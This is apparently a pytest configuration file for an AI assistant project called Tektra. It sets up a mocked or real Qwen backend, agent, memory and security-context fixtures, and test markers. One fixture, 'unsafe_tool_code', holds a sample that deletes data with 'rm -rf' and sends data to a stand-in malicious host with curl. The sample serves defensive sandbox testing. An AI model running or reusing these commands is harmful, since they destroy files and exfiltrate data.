#!/usr/bin/env python3
"""
Tektra AI Assistant - Test Configuration

Pytest configuration and shared fixtures for all Tektra tests.
Provides common test utilities, fixtures, and configuration.

UV Dependencies:
# Install UV if not available: curl -LsSf https://astral.sh/uv/install.sh | sh
# Run with dependencies: uv run --with pytest,pytest-asyncio,loguru python -m pytest
"""

# /// script
# requires-python = ">=3.11"
# dependencies = [
#     "pytest>=7.4.0",
#     "pytest-asyncio>=0.21.0",
#     "loguru>=0.7.0",
#     "psutil>=5.9.0",
# ]
# ///

import asyncio
import os
import sys
import tempfile
import uuid
from pathlib import Path
from typing import Dict, Any, Generator, AsyncGenerator
import pytest

from loguru import logger

# Add src to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

# Import Tektra components for fixtures
try:
    from tektra.core.tektra_system import TektraSystem, TektraSystemConfig
    from tektra.config.production_config import ProductionConfig, create_development_config
    from tektra.security.context import SecurityContext, SecurityLevel
except ImportError:
    # Fallback for legacy imports
    pass

# Global variables to cache expensive resources
_qwen_backend = None
_model_loaded = False


def pytest_addoption(parser):
    """Add custom command line options."""
    parser.addoption(
        "--no-heavy-models",
        action="store_true",
        default=False,
        help="Skip loading heavy AI models (tests will be mocked)",
    )
    parser.addoption(
        "--model-path",
        action="store",
        default=None,
        help="Path to pre-downloaded models directory",
    )
    parser.addoption(
        "--include-slow",
        action="store_true",
        default=False,
        help="Include slow-running tests",
    )
    parser.addoption(
        "--test-environment",
        action="store",
        default="testing",
        help="Test environment (testing, development, staging)",
    )


@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest.fixture(scope="session")
async def qwen_backend(request):
    """
    Session-scoped fixture for Qwen backend.

    This loads the model once per test session and reuses it across all tests.
    If --no-heavy-models is passed, returns a mock backend instead.
    """
    global _qwen_backend, _model_loaded

    if _qwen_backend is not None:
        return _qwen_backend

    # Check if we should skip heavy models
    if request.config.getoption("--no-heavy-models"):
        # Return a mock backend
        from unittest.mock import AsyncMock, MagicMock

        mock_backend = MagicMock()
        mock_backend.initialize = AsyncMock(return_value=True)
        mock_backend.cleanup = AsyncMock()
        # Fix: Return actual string responses for JSON parsing
        mock_backend.process_text_query = AsyncMock(return_value="Mock response")
        mock_backend.process_vision_query = AsyncMock(
            return_value="Mock vision response"
        )
        mock_backend.generate_response = AsyncMock(return_value="Mock response")
        mock_backend.is_initialized = True
        _qwen_backend = mock_backend
        return _qwen_backend

    # Load the actual model
    try:
        from tektra.ai.qwen_backend import QwenBackend, QwenModelConfig

        print(
            "\n🔄 Loading Qwen model (this will only happen once per test session)..."
        )

        # Configure with reduced memory for testing
        config = QwenModelConfig(
            model_name="Qwen/Qwen2.5-VL-7B-Instruct",
            quantization_bits=None,
            max_memory_gb=4.0,  # Reduced for testing
            device_map="auto",
            torch_dtype="float16",  # Use float16 to reduce memory
        )

        # Check for custom model path
        model_path = request.config.getoption("--model-path")
        if model_path:
            os.environ["HF_HOME"] = model_path
            print(f"Using custom model path: {model_path}")

        backend = QwenBackend(config)
        success = await backend.initialize()

        if not success:
            pytest.skip("Failed to initialize Qwen backend")
            return None

        _qwen_backend = backend
        _model_loaded = True
        print("✅ Qwen model loaded successfully and will be reused for all tests")

        # Register cleanup
        request.addfinalizer(lambda: asyncio.run(cleanup_qwen_backend()))

        return _qwen_backend

    except Exception as e:
        print(f"❌ Failed to load Qwen backend: {e}")
        pytest.skip(f"Qwen backend not available: {e}")
        return None


async def cleanup_qwen_backend():
    """Cleanup function for Qwen backend."""
    global _qwen_backend, _model_loaded
    if _qwen_backend and _model_loaded:
        print("\n🧹 Cleaning up Qwen backend...")
        await _qwen_backend.cleanup()
        _qwen_backend = None
        _model_loaded = False


@pytest.fixture(scope="function")
async def memory_manager():
    """
    Function-scoped fixture for memory manager.

    Creates a fresh memory manager with temporary storage for each test.
    """
    from tektra.memory import MemoryConfig, TektraMemoryManager

    with tempfile.TemporaryDirectory() as temp_dir:
        config = MemoryConfig(
            storage_path=temp_dir,
            database_name="test.db",
            use_memos=False,  # Disable MemOS for tests
            enable_semantic_search=False,  # Disable for speed
        )

        manager = TektraMemoryManager(config)
        await manager.initialize()

        yield manager

        await manager.cleanup()


@pytest.fixture(scope="function")
async def agent_builder(qwen_backend):
    """
    Function-scoped fixture for agent builder.

    Uses the session-scoped Qwen backend to avoid reloading the model.
    """
    if qwen_backend is None:
        pytest.skip("Qwen backend not available")
        return None

    try:
        from tektra.agents.builder import AgentBuilder

        builder = AgentBuilder(qwen_backend)
        return builder
    except ImportError:
        pytest.skip("Agent builder not available")
        return None


@pytest.fixture(scope="function")
async def agent_registry():
    """Function-scoped fixture for agent registry."""
    try:
        from tektra.agents import AgentRegistry

        registry = AgentRegistry()
        # Check if registry has initialize method
        if hasattr(registry, "initialize"):
            await registry.initialize()
        yield registry
        # Check if registry has cleanup method
        if hasattr(registry, "cleanup"):
            await registry.cleanup()
    except ImportError:
        pytest.skip("Agent registry not available")
        yield None


@pytest.fixture(scope="function")
def temp_dir():
    """Provide a temporary directory for tests."""
    with tempfile.TemporaryDirectory() as temp_dir:
        yield Path(temp_dir)


# Pytest configuration
def pytest_configure(config):
    """Configure pytest for Tektra tests."""
    # Configure loguru for testing
    logger.remove()  # Remove default handler
    logger.add(
        "tests/logs/test_{time}.log",
        rotation="1 day",
        retention="7 days",
        level="DEBUG",
        format="{time} | {level} | {name}:{function}:{line} | {message}"
    )
    
    # Add console logging for test runs
    logger.add(
        lambda msg: print(msg, end=""),
        level="INFO",
        format="<green>{time:HH:mm:ss}</green> | <level>{level: <8}</level> | {message}\n"
    )
    
    # Configure custom markers
    config.addinivalue_line("markers", "heavy: marks tests that use heavy AI models")
    config.addinivalue_line("markers", "integration: marks integration tests")
    config.addinivalue_line("markers", "unit: marks unit tests")
    config.addinivalue_line("markers", "slow: marks slow-running tests")
    config.addinivalue_line("markers", "e2e: marks end-to-end tests")
    config.addinivalue_line("markers", "security: marks security-related tests")
    config.addinivalue_line("markers", "performance: marks performance tests")
    config.addinivalue_line("markers", "deployment: marks deployment tests")
    config.addinivalue_line("markers", "compliance: marks compliance tests")
    config.addinivalue_line("markers", "benchmark: marks benchmark tests")
    
    logger.info("🧪 Configuring Tektra Test Suite")


def pytest_collection_modifyitems(config, items):
    """Modify test collection to add markers and organize tests."""
    for item in items:
        # Add markers based on file location
        if "e2e" in str(item.fspath):
            item.add_marker(pytest.mark.e2e)
        elif "integration" in str(item.fspath):
            item.add_marker(pytest.mark.integration)
        elif "unit" in str(item.fspath):
            item.add_marker(pytest.mark.unit)
        
        # Add markers based on test name patterns
        if "security" in item.name.lower():
            item.add_marker(pytest.mark.security)
        elif "performance" in item.name.lower():
            item.add_marker(pytest.mark.performance)
        elif "deployment" in item.name.lower():
            item.add_marker(pytest.mark.deployment)
        elif "benchmark" in item.name.lower():
            item.add_marker(pytest.mark.benchmark)
        
        # Skip slow tests unless explicitly included
        if not config.getoption("--include-slow"):
            if item.get_closest_marker("slow"):
                item.add_marker(pytest.mark.skip(reason="Slow test skipped (use --include-slow)"))


def pytest_sessionstart(session):
    """Called after the Session object has been created."""
    logger.info("🚀 Starting Tektra Test Session")
    
    # Create test directories
    test_dirs = ["tests/logs", "tests/temp", "tests/reports"]
    for test_dir in test_dirs:
        Path(test_dir).mkdir(parents=True, exist_ok=True)


def pytest_sessionfinish(session, exitstatus):
    """Called after whole test run finished."""
    if exitstatus == 0:
        logger.info("✅ All tests completed successfully")
    else:
        logger.error(f"❌ Tests failed with exit status: {exitstatus}")
    
    logger.info("🎯 Tektra Test Session Complete")


def pytest_runtest_setup(item):
    """Called before each test item is executed."""
    logger.debug(f"🧪 Setting up test: {item.name}")


def pytest_runtest_teardown(item, nextitem):
    """Called after each test item is executed."""
    logger.debug(f"🧹 Tearing down test: {item.name}")


# Enhanced fixtures for new test suite

@pytest.fixture(scope="session")
def project_root() -> Path:
    """Get the project root directory."""
    return Path(__file__).parent.parent


@pytest.fixture(scope="session")
def test_data_dir(project_root) -> Path:
    """Get the test data directory."""
    test_data = project_root / "tests" / "data"
    test_data.mkdir(exist_ok=True)
    return test_data


@pytest.fixture
def temp_dir() -> Generator[Path, None, None]:
    """Create a temporary directory for test use."""
    with tempfile.TemporaryDirectory() as temp_path:
        yield Path(temp_path)


@pytest.fixture
def test_config() -> ProductionConfig:
    """Create a test configuration."""
    try:
        config = create_development_config()
        
        # Override settings for testing
        config.debug = True
        config.environment = "testing"
        config.agents.max_concurrent_agents = 3
        config.performance.max_memory_mb = 1024
        config.monitoring.prometheus_enabled = False
        
        return config
    except:
        # Fallback for legacy tests
        return None


@pytest.fixture
def tektra_config(test_config) -> TektraSystemConfig:
    """Create Tektra system configuration for testing."""
    if test_config:
        return test_config.to_tektra_config()
    return None


@pytest.fixture
async def tektra_system(tektra_config) -> AsyncGenerator[TektraSystem, None]:
    """Create and initialize a Tektra system for testing."""
    if not tektra_config:
        pytest.skip("Tektra system configuration not available")
        return
    
    system = TektraSystem(tektra_config)
    
    try:
        # Initialize with timeout
        init_task = asyncio.create_task(system.initialize())
        await asyncio.wait_for(init_task, timeout=30.0)
        
        if system.state.value == "running":
            yield system
        else:
            raise RuntimeError("Failed to initialize Tektra system")
    
    except Exception as e:
        logger.error(f"Failed to initialize Tektra system: {e}")
        pytest.skip(f"Tektra system initialization failed: {e}")
    
    finally:
        # Clean shutdown
        try:
            await asyncio.wait_for(system.shutdown(), timeout=10.0)
        except Exception as e:
            logger.warning(f"Error during system shutdown: {e}")


@pytest.fixture
def security_context() -> SecurityContext:
    """Create a security context for testing."""
    try:
        return SecurityContext(
            agent_id=f"test_agent_{uuid.uuid4().hex[:8]}",
            security_level=SecurityLevel.MEDIUM,
            session_id=f"test_session_{uuid.uuid4().hex[:8]}",
            user_id="test_user"
        )
    except:
        return None


@pytest.fixture
def high_security_context() -> SecurityContext:
    """Create a high security context for testing."""
    try:
        return SecurityContext(
            agent_id=f"high_sec_agent_{uuid.uuid4().hex[:8]}",
            security_level=SecurityLevel.HIGH,
            session_id=f"high_sec_session_{uuid.uuid4().hex[:8]}",
            user_id="admin_user"
        )
    except:
        return None


@pytest.fixture
def low_security_context() -> SecurityContext:
    """Create a low security context for testing."""
    try:
        return SecurityContext(
            agent_id=f"low_sec_agent_{uuid.uuid4().hex[:8]}",
            security_level=SecurityLevel.LOW,
            session_id=f"low_sec_session_{uuid.uuid4().hex[:8]}",
            user_id="guest_user"
        )
    except:
        return None


# Test data fixtures
@pytest.fixture
def sample_agent_config() -> Dict[str, Any]:
    """Sample agent configuration for testing."""
    return {
        "model": "text_completion",
        "max_tokens": 100,
        "temperature": 0.7,
        "timeout": 30.0
    }


@pytest.fixture
def sample_task_description() -> str:
    """Sample task description for testing."""
    return "Generate a simple greeting message for a new user"


@pytest.fixture
def safe_tool_code() -> str:
    """Safe tool code for testing."""
    return '''
def safe_calculation(x, y):
    """Perform a safe mathematical calculation."""
    if not isinstance(x, (int, float)) or not isinstance(y, (int, float)):
        raise ValueError("Invalid input types")
    return x + y

result = safe_calculation(10, 20)
print(f"Calculation result: {result}")
'''


@pytest.fixture
def unsafe_tool_code() -> str:
    """Unsafe tool code for testing."""
    return '''
import os
import subprocess

def dangerous_operation():
    """This is a dangerous operation that should be blocked."""
    os.system("rm -rf /important/data")
    subprocess.run(["curl", "http://malicious-site.com/exfiltrate"], shell=True)

dangerous_operation()
'''


# Legacy fixtures (preserved for backward compatibility)
@pytest.fixture(scope="function")
async def memory_manager():
    """Function-scoped fixture for memory manager (legacy)."""
    try:
        from tektra.memory import MemoryConfig, TektraMemoryManager

        with tempfile.TemporaryDirectory() as temp_dir:
            config = MemoryConfig(
                storage_path=temp_dir,
                database_name="test.db",
                use_memos=False,
                enable_semantic_search=False,
            )

            manager = TektraMemoryManager(config)
            await manager.initialize()

            yield manager

            await manager.cleanup()
    except ImportError:
        pytest.skip("Memory manager not available")


@pytest.fixture(scope="function")
async def agent_builder(qwen_backend):
    """Function-scoped fixture for agent builder (legacy)."""
    if qwen_backend is None:
        pytest.skip("Qwen backend not available")
        return None

    try:
        from tektra.agents.builder import AgentBuilder

        builder = AgentBuilder(qwen_backend)
        return builder
    except ImportError:
        pytest.skip("Agent builder not available")
        return None


@pytest.fixture(scope="function")
async def agent_registry():
    """Function-scoped fixture for agent registry (legacy)."""
    try:
        from tektra.agents import AgentRegistry

        registry = AgentRegistry()
        if hasattr(registry, "initialize"):
            await registry.initialize()
        yield registry
        if hasattr(registry, "cleanup"):
            await registry.cleanup()
    except ImportError:
        pytest.skip("Agent registry not available")
        yield None


# Cleanup fixtures
@pytest.fixture(autouse=True)
def cleanup_test_artifacts():
    """Automatically clean up test artifacts after each test."""
    yield
    
    # Clean up any temporary files or resources
    temp_patterns = [
        "test_*.tmp",
        "*.test",
        "test_agent_*",
        "test_session_*"
    ]
    
    import glob
    for pattern in temp_patterns:
        for file_path in glob.glob(pattern):
            try:
                Path(file_path).unlink()
            except Exception:
                pass
